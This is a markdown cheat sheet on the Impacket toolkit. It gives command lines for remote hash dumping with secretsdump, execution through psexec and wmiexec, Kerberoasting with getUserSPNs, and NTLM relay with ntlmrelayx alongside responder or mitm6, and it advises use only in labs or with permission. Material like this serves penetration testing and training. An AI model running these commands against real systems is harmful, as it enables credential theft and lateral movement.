## üì¶ Key Tools in Impacket

Here are the most commonly used Impacket scripts:

| Tool             | Description                                 |
| ---------------- | ------------------------------------------- |
| `smbclient.py`   | SMB client (like a Linux `smbclient`)       |
| `secretsdump.py` | Dump hashes (SAM, NTDS) remotely            |
| `wmiexec.py`     | Remote command execution via WMI            |
| `psexec.py`      | Execute commands as a service (like PsExec) |
| `smbexec.py`     | Command execution via SMB                   |
| `ntlmrelayx.py`  | SMB/HTTP relay attack tool                  |
| `rpcdump.py`     | Dump RPC endpoints                          |
| `lookupsid.py`   | Enumerate SIDs to usernames                 |
| `ticketer.py`    | Create custom Kerberos tickets              |
| `getTGT.py`      | Request a TGT using a password/hash         |
| `getUserSPNs.py` | Extract SPNs for Kerberoasting              |

---

## üîê Credential Formats

Impacket supports:

- Plaintext: `username:password`    
- NTLM Hash: `username:HASH:NTHASH`
- Kerberos: `-k -no-pass` with ticket from `KRB5CCNAME`
- Domain users: `DOMAIN/username`

---
## üß™ Example Usage

### ‚úÖ 1. SMB File Access

```
smbclient.py WORKGROUP/user:password@10.10.10.10
```

### ‚úÖ 2. Remote Command Execution (PsExec)

```
psexec.py WORKGROUP/admin:password@10.10.10.10
```

### ‚úÖ 3. WMI Execution

```
wmiexec.py WORKGROUP/admin:password@10.10.10.10
```

### ‚úÖ 4. Dumping Hashes

```
secretsdump.py WORKGROUP/admin:password@10.10.10.10
```

You can also dump from local SAM/SECURITY/NTDS files:

```
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### ‚úÖ 5. SID Enumeration

```
lookupsid.py WORKGROUP/user:password@10.10.10.10
```

### ‚úÖ 6. Kerberoasting (SPNs)

```
getUserSPNs.py -request WORKGROUP/user:password
```

---

## üõ°Ô∏è NTLM Relay Attacks

Using `ntlmrelayx.py` to capture and relay authentication:

```
ntlmrelayx.py -tf targets.txt -smb2support
```

Start responder or mitm6 to capture hashes and relay them with `ntlmrelayx`.

---

## üéì Best Use Cases

| Use Case              | Tool                            |
| --------------------- | ------------------------------- |
| Hash dumping          | `secretsdump.py`                |
| Lateral movement      | `psexec.py`, `wmiexec.py`       |
| SMB enumeration       | `smbclient.py`, `lookupsid.py`  |
| Relay attacks         | `ntlmrelayx.py`                 |
| Kerberos exploitation | `ticketer.py`, `getUserSPNs.py` |

---
## ‚ö†Ô∏è Tips

- For hash-based auth, use `-hashes <LM>:<NT>` instead of passwords.    
- Use in isolated labs or with permission only‚Äîthese tools are **intrusive**.
- Use Kerberos ticketing tools with care‚Äîclock skew will break auth.

